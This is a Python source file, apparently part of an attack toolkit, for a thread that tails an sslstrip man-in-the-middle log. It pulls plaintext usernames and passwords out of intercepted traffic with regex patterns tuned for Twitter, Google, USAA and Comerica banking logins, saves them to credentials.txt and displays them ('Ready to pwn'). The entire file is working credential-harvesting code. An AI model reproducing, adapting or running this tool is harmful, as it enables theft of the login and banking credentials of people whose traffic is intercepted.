# Copyright (c) 2013 KernelSanders
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#
import time
import threading
import os
import re
'''
This parser class tails the sslstrip.log and pulls out the plaintext credentials with regex.
If a site is not cought by the parser, look in sslstip.log for the username and password variable
names and add them to the top of the usernameOptions and passwordOptions lists. On the next run
they should be captured. The credentials are also saved to a file called credentials.txt.
'''
class sslstripLogParser(threading.Thread):
    '''
    Set up the queue that is used to communicate with the GUI as well as the log file.
    Also, this ensures that sslstrip.log exists and if it doesn't it will be created.
    This is important because if this thread starts running before sslstrip, tail will
    fail because the log doesn't exist.
    '''
    def __init__(self, queue):
        self.listen = True
        self.queue = queue
        self.sslLog = '' # have to declare instance variables in __init()__
        self.log = os.open( "credentials.txt", os.O_RDWR|os.O_APPEND|os.O_CREAT ) # thread safe file writing from : http://www.tutorialspoint.com/python/os_open.htm
        if not os.path.isfile(os.path.join(os.getcwd(),'sslstrip.log')):
            f=open('sslstrip.log', 'w')
            f.close()
        super(sslstripLogParser,self).__init__()

    '''
    Start tailing the sslstrip log, and regexing the output to find credentials.
    '''
    def run(self):
        '''
        Given a domain, username, and password, save them in the log and put them in the queue so the
        asynchronous GUI can pop and display them.
        '''
        def printAndWriteLog(domain, username, password):
            os.write(self.log, str(domain) + '\n')
            os.write(self.log, "Username: " + str(username) + '\n')
            os.write(self.log, "Password: " + str(password) + '\n\n')
            self.queue.put('\n' + str(domain))
            self.queue.put("Username: " + str(username))
            self.queue.put("Password: " + str(password) + '\n')


        def follow(thefile): # from http://www.dabeaz.com/generators/Generators.pdf
            thefile.seek(0,2) # Go to the end of the file
            while True:
                try:
                    line = thefile.readline()
                    if not line:
                        time.sleep(0.1) # Sleep briefly
                        continue
                    yield line
                except ValueError:
                    break

        lastDomain = ''
        hasUser = False

        usernameOptions = [
            "j_username", # USAA Mobile
            "email[a-z0-9%_\-]*",
            "login_email",
            "Email",
            "session%5Busername_or_email%5D", # Twitter
            "user[a-z0-9%_\-]*",
            "session_key",
            "login[a-z0-9%_\-]*",
            "txtUsername"
        ]

        passwordOptions = [
            "pass[a-z0-9%_\-]*",
            "login_pass",
            "Passwd",
            "passwd",
            "session%5Bpassword%5D", # Twitter
            "PWDpassword1",
            "session_password",
            "txtPassword"
        ]

        '''
        Some work left to be done with the regex here. the domain regex requires "www." which misses
        a few domains. A quick work around is to build out the if statement to check for specific domains that
        we know come through without "www."
        '''
        self.sslLog = open('sslstrip.log', 'r')
        loglines = follow(self.sslLog)
        self.queue.put('\nStarting the parser...')
        self.queue.put('Ready to pwn. (^C exits)\n')
        for line in loglines:
            if self.listen:
                domain = re.search(r"""(www\.[a-z0-9%_\-]*.[a-z]*)""", line)
                #domain = re.search(re.compile(r'[\w\-\.]+\.(?:com|edu|net|org)'),line)
                if domain:
                    lastDomain = str(domain.group())
                elif "twitter.com" in line:
                    lastDomain = "www.twitter.com"
                elif "accounts.google.com" in line:
                    lastDomain = "accounts.google.com"
                elif "webbanking.comerica.com" in line:
                    lastDomain = "webbanking.comerica.com"
                elif "mobile.usaa.com" in line:
                    lastDomain = "mobile.usaa.com"

                # Loop through the different username patterns
                for num in usernameOptions:
                    username = re.search(re.compile(num +'=[^&]*'), line)
                    if username:
                        hasUser = True
                        break

                # Loop through the different password patterns
                for num2 in passwordOptions:
                    password = re.search(re.compile(num2 + '=[^&]*'), line)
                    if password:
                        if hasUser:
                            hasUser = False
                            parsedUsername = str(username.group()).replace('%40', '@').split('=')[1]
                            parsedPassword = str(password.group()).split('=')[1]
                            printAndWriteLog(lastDomain, parsedUsername, parsedPassword)
                            lastDomain = ''
                        break

    def stop(self):
        self.listen = False
        try:
            self.sslLog.close()
        except: # in case we quit before the log is opened
            pass
        os.close(self.log)
        super(sslstripLogParser,self).join(None)
        
